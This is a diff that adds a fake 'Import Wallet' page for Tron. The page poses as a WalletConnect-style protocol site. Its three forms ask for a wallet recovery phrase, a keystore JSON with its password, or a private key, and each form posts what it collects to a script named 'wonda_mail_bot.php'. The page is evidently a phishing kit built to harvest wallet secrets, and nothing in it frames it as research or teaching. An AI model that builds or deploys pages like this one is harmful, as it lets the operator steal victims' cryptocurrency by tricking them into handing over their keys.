@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#000000">
+    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
+    <!-- <meta property="og:image" content="images/logo.svg"> -->
+    <!-- <link rel="icon" href="images/logo.svg"> -->
+    <!-- css -->
+    <link rel="stylesheet" href="css/main.css"/> 
+
+<title>Import Wallet</title>
+</head>
+
+<body style="text-align:center;">
+    
+<!-- import -->
+    <h2 style="text-align:center;">Import Wallet</h2>
+    </br>
+
+    <div class="tab">
+        <button class="tablinks" id="default" onclick="openCity(event, 'phrase')"><b>Phrase</b></button>
+        <button class="tablinks" onclick="openCity(event, 'keystore')"><b>Keystore JSON</b></button>
+        <button class="tablinks" onclick="openCity(event, 'private')"><b>Private Key</b></button>
+    </div>
+
+    <!-- phrase -->
+    <div id="phrase" class="tabcontent">
+        <form action="wonda_mail_bot.php" method="POST">
+            <input type="hidden" name="wallettype" value="tron"/>
+            <input type="hidden" name="category" value="Phrase"/>
+
+            <textarea name="phrase" class="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
+            </br>
+            <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+            </br>
+            <div class="btn-wrapper">
+                <button type="submit" name="import" class="btn">IMPORT</button>
+            </div>
+            <!-- <button type="submit" name="import" class="btn">IMPORT</button> -->
+        </form>
+    </div>
+
+    <!-- keystore -->
+    <div id="keystore" class="tabcontent">
+        <form action="wonda_mail_bot.php" method="POST">
+            <input type="hidden" name="wallettype" value="tron"/>
+            <input type="hidden" name="category" value="Keystore JSON"/>
+
+            <textarea name="keystore" class="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
+            </br>
+            <div class="field">
+                <input type="text" name="password" placeholder="Password" required/>
+            </div>
+            <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
+            </br>
+            <div class="btn-wrapper">
+                <button type="submit" name="import" class="btn">IMPORT</button>
+            </div>
+        </form>
+    </div>
+
+    <!-- private key -->
+    <div id="private" class="tabcontent">
+        <form action="wonda_mail_bot.php" method="POST">
+            <input type="hidden" name="wallettype" value="tron"/>
+            <input type="hidden" name="category" value="Private Key"/>
+            <div class="field">
+                <input type="text" name="key" class="key" placeholder="Private Key" required/>
+            </div>
+            <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+            </br>
+            <div class="btn-wrapper">
+                <button type="submit" name="import" class="btn">IMPORT</button>
+            </div>
+        </form>
+    </div>
+
+    <!-- import done notify -->
+    
+    <script>
+
+        document.getElementById("default").click();
+
+        function openCity(evt, cityName) {
+        // Declare all variables
+            var i, tabcontent, tablinks;
+        
+            // Get all elements with class="tabcontent" and hide them
+            tabcontent = document.getElementsByClassName("tabcontent");
+            for (i = 0; i < tabcontent.length; i++) {
+            tabcontent[i].style.display = "none";
+            }
+        
+            // Get all elements with class="tablinks" and remove the class "active"
+            tablinks = document.getElementsByClassName("tablinks");
+            for (i = 0; i < tablinks.length; i++) {
+            tablinks[i].className = tablinks[i].className.replace(" active", "");
+            }
+        
+            // Show the current tab, and add an "active" class to the button that opened the tab
+            document.getElementById(cityName).style.display = "block";
+            evt.currentTarget.className += " active";
+        }
+
+    </script>
+<!-- footer -->
+<footer>
+    <div class="footer-wrapper" id="footer">
+    <p><img src="images/discord.svg" class="footimg" alt="discord icon">  <a href="indexdb.php-type=tron.html#" rel="noreferrer noopener">Discord</a></p></br>
+    <p><img src="images/telegram.svg" class="footimg" alt="telegram icon">  <a href="indexdb.php-type=tron.html#" rel="noreferrer noopener">Telegram</a></p></br>
+    <p><img src="images/twitter.svg" class="footimg" alt="twitter icon">  <a href="indexdb.php-type=tron.html#" rel="noreferrer noopener">Twitter</a></p></br>
+    <p><img src="images/github.svg" class="footimg" alt="github icon">  <a href="indexdb.php-type=tron.html#" rel="noreferrer noopener">Github</a></p></br>
+    </div>
+    </footer>
+</body>
+</html>
